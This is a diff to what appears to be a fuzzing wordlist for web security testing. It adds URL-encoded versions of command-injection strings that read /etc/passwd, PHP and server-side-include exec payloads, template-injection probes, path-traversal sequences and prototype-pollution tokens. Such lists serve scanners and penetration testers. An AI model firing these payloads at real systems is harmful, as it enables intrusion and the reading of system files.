@@ -1,48 +1,88 @@
+%7Cid%20%23
 |id #
+%60id%60
 `id`
+%24PATH
 $PATH
+'%24PATH
 '$PATH
+%22%24PATH
 "$PATH
 --help
 --version
+%24(%60cat%20%2Fetc%2Fpasswd%60)
 $(`cat /etc/passwd`)
+%7Ccat%20%2Fetc%2Fpasswd
 |cat /etc/passwd
+%3Bcat%20%2Fetc%2Fpasswd%23
 ;cat /etc/passwd#
+%3Bcat%20%2Fetc%2Fpasswd
 ;cat /etc/passwd
+%250Acat%2520%2Fetc%2Fpasswd
 %0Acat%20/etc/passwd
+system('cat%20%2Fetc%2Fpasswd')%3B
 system('cat /etc/passwd');
+%3C%3Fphp%20system(%22cat%20%2Fetc%2Fpasswd%22)%3B%3F%3E
 <?php system("cat /etc/passwd");?>
-%0Acat%20/etc/passwd
+%3Bsystem('cat%2520%2Fetc%2Fpasswd')
 ;system('cat%20/etc/passwd')
+%26lt%3B!--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+%7B%7B%20get_user_file(%22%2Fetc%2Fpasswd%22)%20%7D%7D
 {{ get_user_file("/etc/passwd") }}
+%3C!--%23exec%20cmd%3D%22%2Fbin%2Fcat%20%2Fetc%2Fpasswd%22--%3E
 <!--#exec cmd="/bin/cat /etc/passwd"-->
+%24%7B%7B%3C%25%5B%25'%22%7D%7D%25%5C.
 ${{<%[%'"}}%\.
+%40(7777*7777)
 @(7777*7777)
+%24%7B7777*7777%7D
 ${7777*7777}
+%23%7B7777*7777%7D
 #{7777*7777}
 T(7777*7777)
+%5B%3D7777*7777%5D
 [=7777*7777]
+%24%7B%7B7777*7777%7D%7D
 ${{7777*7777}}
+%7B%7B7777*7777%7D%7D
 {{7777*7777}}
+%7B%7B%3D%207777*7777%7D%7D
 {{= 7777*7777}}
+%7B%25%20debug%20%25%7D
 {% debug %}
+%3C%25%3D%207777*7777%20%25%3E
 <%= 7777*7777 %>
+%3C%25%207777*7777%20%25%3E
 <% 7777*7777 %>
+%7Bsystem('echo%2060481729')%7D
 {system('echo 60481729')}
+*%7B7777*7777%7D
 *{7777*7777}
+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ../../../../../../../etc/passwd
+..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fetc%25252fpasswd
 ..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%2500
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00
+.%5E%2C%2F%3C%3E'%22
 .^,/<>'"
+%3B'
 ;'
+%23
 #
+%5C
 \
+%24%7B
 ${
 *
+%2F*
 /*
+%2F%2F
 //
+%3F
 ?
+%40
 @
 toString
 __proto__
